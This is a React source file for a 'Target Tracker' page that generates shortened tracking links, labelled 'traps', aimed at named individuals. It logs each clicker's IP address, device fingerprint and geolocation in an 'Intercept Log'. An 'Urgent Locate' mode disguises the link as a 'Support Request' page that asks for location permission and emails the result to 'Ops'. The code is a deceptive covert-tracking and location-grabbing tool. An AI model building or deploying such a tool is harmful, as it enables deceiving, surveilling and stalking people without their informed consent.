
import React, { useState } from 'react';
import { Target, Link, Copy, AlertTriangle, MapPin, Smartphone, Globe, Activity, Siren, UserPlus, ChevronDown } from 'lucide-react';
import { useToast } from '../services/toastContext';
import { TrackedClick } from '../types';
import { dbService, STORES } from '../services/db';
import { CORS_PROXY } from '../services/config';

const TrackerPage: React.FC = () => {
  const [activeMode, setActiveMode] = useState<'honeypot' | 'emergency'>('honeypot');
  
  // Honeypot State
  const [targetUrl, setTargetUrl] = useState('');
  const [targetName, setTargetName] = useState('');
  const [shortLink, setShortLink] = useState('');
  const [shortenerService, setShortenerService] = useState<'1pt' | 'tinyurl' | 'isgd'>('1pt');
  
  // Emergency State
  const [customerName, setCustomerName] = useState('');
  const [emergencyLink, setEmergencyLink] = useState('');

  const [loading, setLoading] = useState(false);
  const [clicks, setClicks] = useState<TrackedClick[]>([]);
  const { addToast } = useToast();

  React.useEffect(() => {
     dbService.getAll<TrackedClick>('tracked_clicks').then(setClicks);
  }, []);

  const generateLink = async (type: 'honeypot' | 'emergency') => {
    setLoading(true);
    setShortLink(''); 
    setEmergencyLink('');
    const appBaseUrl = window.location.origin;
    const trackingId = Math.random().toString(36).substring(7); // GUID-lite
    
    let longUrl = '';
    let customShort = '';

    if (type === 'honeypot') {
        if (!targetUrl) { setLoading(false); return; }
        const params = new URLSearchParams();
        params.append('target', targetUrl);
        params.append('trace', trackingId);
        if(targetName) params.append('name', targetName);
        
        longUrl = `${appBaseUrl}/?${params.toString()}`;
    } else {
        // Emergency Trace URL Logic
        const params = new URLSearchParams();
        params.append('emergency_trace', trackingId);
        // Allow name for emergency too
        if (customerName) params.append('name', customerName);
        
        longUrl = `${appBaseUrl}/?${params.toString()}`;
        
        // Try to make a readable short link based on name
        if (customerName) customShort = `locate-${customerName.replace(/[^a-zA-Z0-9]/g, '')}-${Math.floor(Math.random()*100)}`;
    }

    try {
        let finalLink = '';

        if (shortenerService === '1pt') {
            let apiUrl = `https://api.1pt.co/addURL?long=${encodeURIComponent(longUrl)}`;
            if (customShort && type === 'emergency') apiUrl += `&short=${customShort}`;
            
            const response = await fetch(apiUrl);
            const data = await response.json();
            if (data.short) {
                finalLink = `https://1pt.co/${data.short}`;
            }
        } else if (shortenerService === 'tinyurl') {
             const response = await fetch(`${CORS_PROXY}${encodeURIComponent(`https://tinyurl.com/api-create.php?url=${longUrl}`)}`);
             const text = await response.text();
             if (text.startsWith('http')) finalLink = text;
        } else if (shortenerService === 'isgd') {
             const response = await fetch(`${CORS_PROXY}${encodeURIComponent(`https://is.gd/create.php?format=simple&url=${longUrl}`)}`);
             const text = await response.text();
             if (text.startsWith('http')) finalLink = text;
        }

        if (finalLink) {
            if (type === 'honeypot') {
                setShortLink(finalLink);
                addToast('success', 'Trap Generated', 'Dynamic landing page configured.');
            } else {
                setEmergencyLink(finalLink);
                addToast('success', 'Urgent Link Active', 'Copied to clipboard automatically.');
                navigator.clipboard.writeText(finalLink);
            }
        } else {
            // Fallback if shortener fails
            finalLink = longUrl;
            if (type === 'honeypot') setShortLink(finalLink);
            else setEmergencyLink(finalLink);
            addToast('warning', 'Shortener Failed', 'Using raw link instead.');
        }

    } catch (e) {
        addToast('error', 'Generation Error', `Could not create short link. Network error.`);
        console.error(e);
    }
    setLoading(false);
  };

  const copyLink = (link: string) => {
      navigator.clipboard.writeText(link);
      addToast('info', 'Copied', 'Link copied to clipboard.');
  };

  return (
    <div className="h-full flex flex-col bg-slate-950 p-6 overflow-hidden">
       <div className="mb-6 flex justify-between items-end">
            <div>
                <h1 className="text-3xl font-black text-white flex items-center gap-2">
                    <Target className="text-red-500 drop-shadow-[0_0_10px_red]" size={32}/> 
                    TARGET <span className="text-slate-500">TRACKER</span>
                </h1>
                <p className="text-slate-400 text-sm mt-1">Generate Geolocated Honeypot Links • Capture IP & Device Fingerprints</p>
            </div>
            <div className="bg-slate-900 p-1 rounded-lg flex gap-2">
                <button 
                    onClick={() => setActiveMode('honeypot')}
                    className={`px-4 py-2 rounded-lg text-xs font-bold transition-colors ${activeMode === 'honeypot' ? 'bg-slate-700 text-white' : 'text-slate-500 hover:text-white'}`}
                >
                    HONEYPOT
                </button>
                <button 
                    onClick={() => setActiveMode('emergency')}
                    className={`px-4 py-2 rounded-lg text-xs font-bold transition-colors flex items-center gap-2 ${activeMode === 'emergency' ? 'bg-red-600 text-white animate-pulse' : 'text-slate-500 hover:text-white'}`}
                >
                    <Siren size={14}/> URGENT LOCATE
                </button>
            </div>
       </div>

       <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 flex-1 overflow-hidden">
            {/* Generator Panel */}
            <div className={`bg-slate-900 border border-slate-800 rounded-xl p-6 h-fit ${activeMode === 'emergency' ? 'border-red-500/50 shadow-[0_0_20px_rgba(220,38,38,0.2)]' : ''}`}>
                
                {activeMode === 'honeypot' ? (
                    <>
                        <h3 className="text-sm font-bold text-slate-300 uppercase mb-4 flex items-center gap-2">
                            <Link size={16}/> Link Generator
                        </h3>
                        <div className="space-y-4">
                            <div>
                                <label className="text-xs text-slate-500 uppercase font-bold mb-1 block">Target Name (Optional)</label>
                                <input 
                                    value={targetName}
                                    onChange={(e) => setTargetName(e.target.value)}
                                    placeholder="e.g. John Smith"
                                    className="w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 text-white text-sm focus:border-red-500 outline-none mb-2"
                                />
                                <label className="text-xs text-slate-500 uppercase font-bold mb-1 block">Destination URL</label>
                                <input 
                                    value={targetUrl}
                                    onChange={(e) => setTargetUrl(e.target.value)}
                                    placeholder="https://google.com"
                                    className="w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 text-white text-sm focus:border-red-500 outline-none"
                                />
                                <p className="text-[10px] text-slate-600 mt-1">Generates a professional landing page greeting the user by name.</p>
                            </div>

                            <div>
                                <label className="text-xs text-slate-500 uppercase font-bold mb-1 block">Shortener Service</label>
                                <div className="relative">
                                    <select 
                                        value={shortenerService}
                                        onChange={(e) => setShortenerService(e.target.value as any)}
                                        className="w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 text-white text-sm appearance-none focus:border-red-500 outline-none"
                                    >
                                        <option value="1pt">1pt.co (Standard)</option>
                                        <option value="tinyurl">TinyURL.com</option>
                                        <option value="isgd">Is.gd</option>
                                    </select>
                                    <ChevronDown className="absolute right-3 top-2.5 text-slate-500 pointer-events-none" size={16}/>
                                </div>
                            </div>

                            <button 
                                onClick={() => generateLink('honeypot')}
                                disabled={loading || !targetUrl}
                                className="w-full bg-slate-800 hover:bg-slate-700 disabled:opacity-50 text-white font-bold py-2 rounded transition-colors flex items-center justify-center gap-2 border border-slate-700"
                            >
                                {loading ? 'ENCRYPTING...' : 'GENERATE TRAP'}
                            </button>

                            {shortLink && (
                                <div className="bg-red-900/10 p-3 rounded border border-red-500/50 mt-4 animate-in fade-in zoom-in duration-300">
                                    <label className="text-[10px] text-red-400 uppercase font-bold mb-1 block flex items-center gap-1"><AlertTriangle size={10}/> Trap Ready</label>
                                    <div className="flex gap-2">
                                        <code className="flex-1 text-cyan-400 font-bold text-sm truncate bg-transparent">{shortLink}</code>
                                        <button onClick={() => copyLink(shortLink)} className="text-slate-400 hover:text-white"><Copy size={14}/></button>
                                    </div>
                                </div>
                            )}
                        </div>
                    </>
                ) : (
                    <>
                        <h3 className="text-sm font-bold text-red-500 uppercase mb-4 flex items-center gap-2">
                            <Siren size={16}/> Emergency Customer Locate
                        </h3>
                        <div className="space-y-4">
                            <div>
                                <label className="text-xs text-red-400 uppercase font-bold mb-1 block">Customer Name / ID</label>
                                <div className="relative">
                                    <UserPlus className="absolute left-3 top-2.5 text-slate-500" size={16}/>
                                    <input 
                                        value={customerName}
                                        onChange={(e) => setCustomerName(e.target.value)}
                                        placeholder="e.g. JohnDoe"
                                        className="w-full bg-slate-950 border border-red-900/50 rounded pl-10 pr-3 py-2 text-white text-sm focus:border-red-500 outline-none placeholder:text-slate-600"
                                    />
                                </div>
                                <p className="text-[10px] text-slate-600 mt-1">Creates a personalized tracking URL. When opened, it prompts the user to grant location permissions.</p>
                            </div>

                            <button 
                                onClick={() => generateLink('emergency')}
                                disabled={loading} // Allow unnamed for anonymous
                                className="w-full bg-red-600 hover:bg-red-700 disabled:opacity-50 text-white font-bold py-3 rounded transition-colors flex items-center justify-center gap-2 shadow-lg shadow-red-900/20"
                            >
                                {loading ? 'GENERATING...' : 'CREATE URGENT LINK'}
                            </button>

                            {emergencyLink && (
                                <div className="bg-red-950/20 p-3 rounded border border-red-500/50 mt-4 animate-in fade-in slide-in-from-top-2">
                                    <label className="text-[10px] text-red-400 uppercase font-bold mb-1 block">Ready to Send</label>
                                    <div className="flex gap-2">
                                        <code className="flex-1 text-white font-bold text-sm truncate bg-transparent">{emergencyLink}</code>
                                        <button onClick={() => copyLink(emergencyLink)} className="text-red-400 hover:text-white"><Copy size={14}/></button>
                                    </div>
                                    <p className="text-[10px] text-green-500 mt-2 flex items-center gap-1"><Activity size={10}/> Auto-copied to clipboard.</p>
                                </div>
                            )}
                            
                            <div className="bg-yellow-900/10 border border-yellow-900/30 p-3 rounded">
                                <p className="text-[10px] text-yellow-600/80">
                                    User will see a "Support Request" page. Location data is emailed to Ops immediately upon approval.
                                </p>
                            </div>
                        </div>
                    </>
                )}
            </div>

            {/* Results Panel */}
            <div className="lg:col-span-2 bg-slate-900 border border-slate-800 rounded-xl flex flex-col overflow-hidden">
                 <div className="p-4 border-b border-slate-800 bg-slate-950/50 flex justify-between items-center">
                     <h3 className="text-sm font-bold text-slate-300 uppercase flex items-center gap-2">
                         <Activity size={16}/> Intercept Log
                     </h3>
                     <span className="text-xs text-slate-500">Database: MongoDB Atlas (Prod)</span>
                 </div>
                 
                 <div className="flex-1 overflow-y-auto p-4 space-y-4">
                     {clicks.length === 0 ? (
                         <div className="text-center text-slate-500 py-10">No intercepts recorded yet.</div>
                     ) : (
                         clicks.map(click => (
                             <div key={click.id} className="bg-slate-800 rounded border border-slate-700 p-4 hover:border-red-500/50 transition-colors">
                                 <div className="flex justify-between items-start mb-2">
                                     <div className="flex items-center gap-2">
                                         <span className="bg-red-900/30 text-red-400 text-xs font-bold px-2 py-0.5 rounded border border-red-900/50">
                                            {click.ip}
                                         </span>
                                         <span className="text-xs text-slate-400">{new Date(click.timestamp).toLocaleString()}</span>
                                     </div>
                                     <div className="text-right">
                                        <div className="text-xs text-slate-300 font-mono">{click.platform}</div>
                                        {click.name && <div className="text-[10px] text-green-400 font-bold uppercase">{click.name}</div>}
                                     </div>
                                 </div>
                                 
                                 <div className="grid grid-cols-2 gap-4 text-xs mt-3">
                                     <div className="flex items-start gap-2">
                                         <MapPin size={14} className="text-slate-500 mt-0.5"/>
                                         <div>
                                             <span className="block text-slate-400 text-[10px] uppercase">Geolocation</span>
                                             <span className="text-white font-mono">{click.lat?.toFixed(5)}, {click.lng?.toFixed(5)}</span>
                                             <a 
                                                 href={`https://www.google.com/maps?q=${click.lat},${click.lng}`} 
                                                 target="_blank" 
                                                 rel="noreferrer"
                                                 className="block text-cyan-500 hover:underline mt-1"
                                             >
                                                 View on Map
                                             </a>
                                         </div>
                                     </div>
                                     <div className="flex items-start gap-2">
                                         <Smartphone size={14} className="text-slate-500 mt-0.5"/>
                                         <div className="overflow-hidden">
                                             <span className="block text-slate-400 text-[10px] uppercase">Device Fingerprint</span>
                                             <span className="text-slate-300 truncate block" title={click.userAgent}>{click.userAgent}</span>
                                         </div>
                                     </div>
                                 </div>
                             </div>
                         ))
                     )}
                 </div>
            </div>
       </div>
    </div>
  );
};

export default TrackerPage;
